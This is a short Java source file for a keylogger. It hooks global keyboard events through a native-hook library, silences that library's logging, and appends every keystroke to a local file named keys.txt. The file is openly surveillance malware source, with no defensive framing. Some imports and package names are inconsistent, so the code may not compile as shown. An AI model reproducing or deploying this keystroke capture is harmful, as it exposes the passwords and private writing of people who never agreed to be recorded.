package main;



import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import javax.sound.midi.Soundbank;

import global.GlobalScreen;
import global.*;

import keyboard.NativeKeyEvent;
import keyboard.NativeKeyListener;


/**
 * @author vakho
 */

public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("keys.txt");


	public static void main(String[] args) {

		System.out.println("Key logger has been started");

		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			System.out.println(e);
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}

	private static void init() {
		
		// Get the logger for "org.jnativehook" and set the level to warning.
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
			
			if (keyText.length() > 1) {
				writer.print("[" + keyText + "]");
			} else {
				writer.print(keyText);
			}
			
		} catch (IOException ex) {
			System.out.println(ex.getMessage() + "  --  "+ ex);
			System.exit(-1);
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		// Nothing
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		// Nothing here
	}
}
